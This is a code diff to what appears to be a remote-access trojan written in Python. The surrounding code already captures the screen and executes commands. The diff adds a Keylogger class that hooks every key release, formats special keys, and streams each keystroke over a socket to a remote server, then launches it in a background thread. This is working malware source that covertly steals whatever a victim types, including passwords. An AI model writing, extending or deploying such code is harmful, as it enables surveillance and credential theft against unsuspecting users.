@@ -66,9 +66,49 @@ class Screenshot:
         self.screenshot.release()
         cv2.destroyAllWindows()
 
+class Keylogger:
+    def __init__(self, interval, server_socket, report_method="file"):
+        self.interval = interval
+        self.log = ""
+        self.server_socket = server_socket
+
+    def callback(self, event):
+        name = event.name
+        if len(name) > 1:
+            if name == "space":
+                name = " "
+            elif name == "enter":
+                name = "[ENTER]\n"
+            elif name == "decimal":
+                name = "."
+            else:
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+        self.log += name
+        self.send_keypress(name)
+
+    def send_keypress(self, keypress):
+        try:
+            self.server_socket.sendall(keypress.encode())
+        except Exception as e:
+            print(f"Error sending keypress: {e}")
+
+
+
+    def start(self):
+        keyboard.on_release(callback=self.callback)
+        print(f"{datetime.now()} - Started keylogger")
+        keyboard.wait()
+
 
 
 # Main program execution
 command = Command()
 command_thread = threading.Thread(target=command.execute)
 command_thread.start()
+
+keylogger = Keylogger(interval=5, server_socket=s)
+keylogger_thread = threading.Thread(target=keylogger.start)
+keylogger_thread.start()
+# keylogger_thread.join()
+
